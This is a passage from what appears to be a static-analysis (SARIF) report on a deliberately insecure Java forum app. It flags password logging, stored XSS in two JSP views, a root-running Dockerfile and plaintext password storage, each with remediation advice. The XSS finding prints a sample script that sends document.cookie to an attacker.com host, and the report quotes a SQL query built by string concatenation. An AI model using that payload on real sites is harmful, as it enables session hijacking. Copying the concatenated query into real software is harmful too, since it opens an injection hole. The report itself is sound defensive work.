        {
          "ruleId": "privacy-violation",
          "level": "error",
          "message": {
            "text": "The <code>JdbcTemplate</code> bean in <code>ForumApplication</code> wraps every <code>DataSource</code> with a <code>ProxyDataSourceBuilder</code> that calls <code>.logQueryBySlf4j(SLF4JLogLevel.DEBUG, …)</code>. This causes every SQL statement executed through the application to be written in full to SLF4J logs.\n\n<code>UserDAO.authenticate()</code> constructs its query by string concatenation:<pre>\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"</pre>Because no parameterized queries are used, the literal plaintext password is embedded in the SQL string. The logging proxy then records this complete string — including the password — to the application log on every authentication attempt.\n\nAny actor who can read the application log file (developers, ops personnel, log-aggregation systems, crash-dump recipients, SIEM/SOAR pipelines, etc.) can harvest every password ever submitted to the login form. This is true even for failed login attempts, where the submitted credential is also fully included in the query.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/ForumApplication.java</code><pre>19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@Bean\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public JdbcTemplate jdbcTemplate(DataSource dataSource) {\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DataSource loggingDataSource = ProxyDataSourceBuilder\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.create(dataSource)\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new JdbcTemplate(loggingDataSource);\n25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n26&nbsp;|&nbsp;\n27&nbsp;|&nbsp;}</pre><h3>Remediation</h3>1. <strong>Remove the logging proxy</strong> (or restrict it so it never logs authentication queries): Remove or narrow the <code>logQueryBySlf4j</code> call. If query logging is needed for debugging, use a parameterized-query-aware logger that redacts bind-parameter values rather than logging the full statement string.\n2. <strong>Use parameterized queries in <code>UserDAO</code></strong>: Switch to <code>jdbcTemplate.query(\"SELECT 1 FROM users WHERE username = ? AND password = ?\", ResultSet::next, username, password)</code>. Even if logging remains enabled, bind parameters are logged separately from the SQL template and can be omitted or masked.\n3. <strong>Hash passwords</strong>: Store and compare password hashes (e.g. bcrypt) instead of plaintext, so that even if the query is somehow logged, the logged value is useless to an attacker.\n\nApplying all three layers (no-credential logging, parameterized queries, and password hashing) provides defence in depth.",
            "markdown": "The `JdbcTemplate` bean in `ForumApplication` wraps every `DataSource` with a `ProxyDataSourceBuilder` that calls `.logQueryBySlf4j(SLF4JLogLevel.DEBUG, …)`. This causes every SQL statement executed through the application to be written in full to SLF4J logs.\n\n`UserDAO.authenticate()` constructs its query by string concatenation:\n```java\n\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n```\nBecause no parameterized queries are used, the literal plaintext password is embedded in the SQL string. The logging proxy then records this complete string — including the password — to the application log on every authentication attempt.\n\nAny actor who can read the application log file (developers, ops personnel, log-aggregation systems, crash-dump recipients, SIEM/SOAR pipelines, etc.) can harvest every password ever submitted to the login form. This is true even for failed login attempts, where the submitted credential is also fully included in the query."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/java/com/example/insecureforum/ForumApplication.java"
                },
                "region": {
                  "startLine": 23,
                  "snippet": {
                    "text": "\n    @Bean\n    public JdbcTemplate jdbcTemplate(DataSource dataSource) {\n        DataSource loggingDataSource = ProxyDataSourceBuilder\n                .create(dataSource)\n                .logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n        return new JdbcTemplate(loggingDataSource);\n    }\n\n}\n"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "E1403836ED13390CD14F4B4BFFB060CF"
          },
          "properties": {
            "impact": 4,
            "likelihood": 3.5,
            "snippetStartLine": 18,
            "summary": "Global SQL query logger logs plaintext user passwords to application logs",
            "remediationSummary": "Remove or restrict the SQL query logging proxy in ForumApplication, and switch UserDAO to parameterized queries so passwords are never embedded in logged SQL strings.",
            "remediation": "1. **Remove the logging proxy** (or restrict it so it never logs authentication queries): Remove or narrow the `logQueryBySlf4j` call. If query logging is needed for debugging, use a parameterized-query-aware logger that redacts bind-parameter values rather than logging the full statement string.\n2. **Use parameterized queries in `UserDAO`**: Switch to `jdbcTemplate.query(\"SELECT 1 FROM users WHERE username = ? AND password = ?\", ResultSet::next, username, password)`. Even if logging remains enabled, bind parameters are logged separately from the SQL template and can be omitted or masked.\n3. **Hash passwords**: Store and compare password hashes (e.g. bcrypt) instead of plaintext, so that even if the query is somehow logged, the logged value is useless to an attacker.\n\nApplying all three layers (no-credential logging, parameterized queries, and password hashing) provides defence in depth."
          }
        },
        {
          "ruleId": "cross-site-scripting",
          "level": "error",
          "message": {
            "text": "The JSP EL expression <code>${msg.body}</code> at line 30 renders the full message body directly into the HTML response without any HTML encoding. JSP EL expressions do <strong>not</strong> automatically escape output; only <code>&lt;c:out value=\"...\"/&gt;</code> or <code>fn:escapeXml()</code> provide escaping.\n\nThe <code>body</code> field is user-supplied text submitted via the compose form and stored verbatim in the database (<code>MessageDAO.post</code> performs no sanitization). An attacker can compose a message whose body contains arbitrary HTML/JavaScript, e.g.:<pre>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</pre>When any other authenticated user opens the message, the script executes in their browser session, enabling session hijacking, credential theft, or further attacks against the application. Because the payload is persisted in the database it affects every viewer, not just a single targeted victim.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/read.jsp</code><pre>25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/article&gt;\n26&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article&gt;\n27&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n30&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${msg.body}\n31&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n32&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n33&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n34&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/article&gt;\n35&nbsp;|&nbsp;&lt;/div&gt;</pre><h3>Remediation</h3>Replace the bare EL expression with JSTL's output-encoding tag:<pre>&lt;c:out value=\"${msg.body}\"/&gt;</pre>Or, if rich-text rendering is genuinely required, sanitize the body server-side with a well-tested HTML sanitiser (e.g. OWASP Java HTML Sanitizer) before placing it into the model, and document the policy clearly. Do not rely solely on client-side filtering.",
            "markdown": "The JSP EL expression `${msg.body}` at line 30 renders the full message body directly into the HTML response without any HTML encoding. JSP EL expressions do **not** automatically escape output; only `<c:out value=\"...\"/>` or `fn:escapeXml()` provide escaping.\n\nThe `body` field is user-supplied text submitted via the compose form and stored verbatim in the database (`MessageDAO.post` performs no sanitization). An attacker can compose a message whose body contains arbitrary HTML/JavaScript, e.g.:\n\n```html\n<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n```\n\nWhen any other authenticated user opens the message, the script executes in their browser session, enabling session hijacking, credential theft, or further attacks against the application. Because the payload is persisted in the database it affects every viewer, not just a single targeted victim."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
                },
                "region": {
                  "startLine": 30,
                  "snippet": {
                    "text": "                        </article>\n                        <article>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        ${msg.body}\n                                    </div>\n                                </div>\n                            </div>\n                        </article>\n                    </div>"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "CFE4E750668A04EB465124ADB05C2FD8"
          },
          "properties": {
            "impact": 4.5,
            "likelihood": 4.5,
            "snippetStartLine": 25,
            "summary": "Stored XSS: message body rendered without HTML encoding in read.jsp",
            "remediationSummary": "Replace ${msg.body} with &lt;c:out value=\"${msg.body}\"/&gt; to HTML-encode the untrusted content before rendering.",
            "remediation": "Replace the bare EL expression with JSTL's output-encoding tag:\n\n```jsp\n<c:out value=\"${msg.body}\"/>\n```\n\nOr, if rich-text rendering is genuinely required, sanitize the body server-side with a well-tested HTML sanitiser (e.g. OWASP Java HTML Sanitizer) before placing it into the model, and document the policy clearly. Do not rely solely on client-side filtering."
          }
        },
        {
          "ruleId": "dockerfile-misconfiguration",
          "level": "note",
          "message": {
            "text": "The Dockerfile contains no <code>USER</code> directive, so the application process (<code>java -jar …</code>) runs as the <code>root</code> user inside the container. If the Java process is compromised through any vulnerability (e.g. remote code execution via a deserialization flaw, path traversal, or SSRF), the attacker inherits full root privileges within the container. This makes container-escape attacks, writing arbitrary files to mounted volumes, and lateral movement significantly easier. No privilege-drop to a dedicated non-root service account ever occurs.<h3>Affected Code</h3><code>Dockerfile</code><pre>1&nbsp;|&nbsp;FROM openjdk:8-jre\n2&nbsp;|&nbsp;ENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\n3&nbsp;|&nbsp;ADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war</pre><h3>Remediation</h3>Add a <code>USER</code> directive after the <code>ADD</code> step to drop to an unprivileged account before the entrypoint is invoked:<pre>FROM openjdk:8-jre\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nRUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser \\\n&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; chown appuser:appuser /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nUSER appuser\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]</pre>This ensures the JVM process has only the minimum required permissions.",
            "markdown": "The Dockerfile contains no `USER` directive, so the application process (`java -jar …`) runs as the `root` user inside the container. If the Java process is compromised through any vulnerability (e.g. remote code execution via a deserialization flaw, path traversal, or SSRF), the attacker inherits full root privileges within the container. This makes container-escape attacks, writing arbitrary files to mounted volumes, and lateral movement significantly easier. No privilege-drop to a dedicated non-root service account ever occurs."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "Dockerfile"
                },
                "region": {
                  "startLine": 1,
                  "snippet": {
                    "text": "FROM openjdk:8-jre\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\n"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "661E4F6E613F1137ED5399F6DD303C21"
          },
          "properties": {
            "impact": 2,
            "likelihood": 2,
            "snippetStartLine": 1,
            "summary": "Dockerfile lacks a USER directive so the Java process runs as root (uid 0)",
            "remediationSummary": "Add a non-root USER directive after ADD so the container process does not run as uid 0.",
            "remediation": "Add a `USER` directive after the `ADD` step to drop to an unprivileged account before the entrypoint is invoked:\n\n```dockerfile\nFROM openjdk:8-jre\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nRUN groupadd -r appuser && useradd -r -g appuser appuser \\\n    && chown appuser:appuser /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nUSER appuser\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\n```\n\nThis ensures the JVM process has only the minimum required permissions."
          }
        },
        {
          "ruleId": "password-management",
          "level": "error",
          "message": {
            "text": "The schema defines <code>password VARCHAR(255)</code> with no indication of hashing, and the seed <code>INSERT</code> statements (lines 10-12) write plaintext passwords directly into the table. The <code>UserDAO.authenticate</code> method confirms the design: it compares the submitted password directly against the column value with <code>password = '...'</code>, meaning the database column always holds the raw secret.\\n\\nAny attacker who obtains read access to the database — via SQL injection elsewhere in the app, a backup leak, or direct DB access — immediately has every user's cleartext password, enabling credential stuffing against other services and complete account takeover with no offline cracking required.<h3>Affected Code</h3><code>src/main/resources/db/migration/V1__init.sql</code><pre>&nbsp;5&nbsp;|&nbsp;);\n&nbsp;6&nbsp;|&nbsp;\n&nbsp;7&nbsp;|&nbsp;INSERT INTO users\n&nbsp;8&nbsp;|&nbsp;&nbsp;&nbsp;(username, password)\n&nbsp;9&nbsp;|&nbsp;VALUES\n10&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****'),\n11&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****'),\n12&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****');\n13&nbsp;|&nbsp;\n14&nbsp;|&nbsp;CREATE TABLE messages (\n15&nbsp;|&nbsp;&nbsp;&nbsp;id BIGINT AUTO_INCREMENT,</pre><h3>Remediation</h3>Replace plaintext storage with a strong adaptive password hash:\\n1. Change the column to hold a hash digest (still <code>VARCHAR(255)</code> is wide enough for bcrypt/Argon2 output).\\n2. At registration/password-change time, hash the password with <strong>bcrypt</strong> (cost ≥ 12), <strong>Argon2id</strong>, or <strong>scrypt</strong> using Spring Security's <code>PasswordEncoder</code> API (e.g. <code>BCryptPasswordEncoder</code>).\\n3. At login time, use <code>passwordEncoder.matches(submitted, storedHash)</code> instead of the raw SQL comparison.\\n4. Update the seed data to use pre-hashed values, or remove seed users from production migrations entirely.",
            "markdown": "The schema defines `password VARCHAR(255)` with no indication of hashing, and the seed `INSERT` statements (lines 10-12) write plaintext passwords directly into the table. The `UserDAO.authenticate` method confirms the design: it compares the submitted password directly against the column value with `password = '...'`, meaning the database column always holds the raw secret.\\n\\nAny attacker who obtains read access to the database — via SQL injection elsewhere in the app, a backup leak, or direct DB access — immediately has every user's cleartext password, enabling credential stuffing against other services and complete account takeover with no offline cracking required."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/resources/db/migration/V1__init.sql"
                },
                "region": {
                  "startLine": 10,
                  "snippet": {
                    "text": ");\n\nINSERT INTO users\n  (username, password)\nVALUES\n  ('****', '****'),\n  ('****', '****'),\n  ('****', '****');\n\nCREATE TABLE messages (\n  id BIGINT AUTO_INCREMENT,"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "75116853BA208F123BCABE61D460C5AA"
          },
          "properties": {
            "impact": 4.5,
            "likelihood": 3.5,
            "snippetStartLine": 5,
            "summary": "User passwords are stored as reversible plaintext strings in the users table.",
            "remediationSummary": "Hash all passwords with bcrypt/Argon2id via Spring Security's PasswordEncoder before storing; never store or compare cleartext passwords.",
            "remediation": "Replace plaintext storage with a strong adaptive password hash:\\n1. Change the column to hold a hash digest (still `VARCHAR(255)` is wide enough for bcrypt/Argon2 output).\\n2. At registration/password-change time, hash the password with **bcrypt** (cost ≥ 12), **Argon2id**, or **scrypt** using Spring Security's `PasswordEncoder` API (e.g. `BCryptPasswordEncoder`).\\n3. At login time, use `passwordEncoder.matches(submitted, storedHash)` instead of the raw SQL comparison.\\n4. Update the seed data to use pre-hashed values, or remove seed users from production migrations entirely."
          }
        },
        {
          "ruleId": "cross-site-scripting",
          "level": "error",
          "message": {
            "text": "In the message list view, <code>${msg.subject}</code> (line 19) and <code>${msg.author}</code> (line 26) are rendered into the HTML response without HTML encoding. Both values originate from the database and are user-controlled. An attacker can inject HTML or JavaScript into either field when composing a message, e.g. placing a <code>&lt;script&gt;</code> tag in the subject so that every user who visits the messages list page is attacked, not only those who open the individual message. This makes the list page itself a persistent XSS attack surface affecting a wider audience than the read page.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/list.jsp</code><pre>14&nbsp;|&nbsp;&lt;div class=\"column is-9\"&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box content\"&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:forEach items=\"${messages}\" var=\"msg\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;a href=\"./read/${msg.id}\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;${msg.subject}&lt;/h4&gt;\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-left\"&gt;\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i class=\"fab fa-readme\"&gt;&lt;/i&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;</pre><h3>Remediation</h3>Encode all user-controlled EL expressions with <code>&lt;c:out&gt;</code>:<pre>&lt;h4&gt;&lt;c:out value=\"${msg.subject}\"/&gt;&lt;/h4&gt;\n...\nby &lt;c:out value=\"${msg.author}\"/&gt; on &lt;c:out value=\"${msg.timestamp}\"/&gt;</pre>",
            "markdown": "In the message list view, `${msg.subject}` (line 19) and `${msg.author}` (line 26) are rendered into the HTML response without HTML encoding. Both values originate from the database and are user-controlled. An attacker can inject HTML or JavaScript into either field when composing a message, e.g. placing a `<script>` tag in the subject so that every user who visits the messages list page is attacked, not only those who open the individual message. This makes the list page itself a persistent XSS attack surface affecting a wider audience than the read page."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/views/messages/list.jsp"
                },
                "region": {
                  "startLine": 19,
                  "snippet": {
                    "text": "                <div class=\"column is-9\">\n                    <div class=\"box content\">\n                        <c:forEach items=\"${messages}\" var=\"msg\">\n                                <article>\n                                    <a href=\"./read/${msg.id}\">\n                                        <h4>${msg.subject}</h4>\n                                        <div class=\"media\">\n                                            <div class=\"media-left\">\n                                                <i class=\"fab fa-readme\"></i>\n                                            </div>\n                                            <div class=\"media-content\">"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "7FB75AE1005C830DC71ECD90B75C4BC2"
          },
          "properties": {
            "impact": 4,
            "likelihood": 4,
            "snippetStartLine": 14,
            "summary": "Stored XSS: message subject and author rendered without HTML encoding in list.jsp",
            "remediationSummary": "Replace ${msg.subject} and ${msg.author} with &lt;c:out&gt; tags to HTML-encode untrusted data in list.jsp.",
            "remediation": "Encode all user-controlled EL expressions with `<c:out>`:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n...\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```"
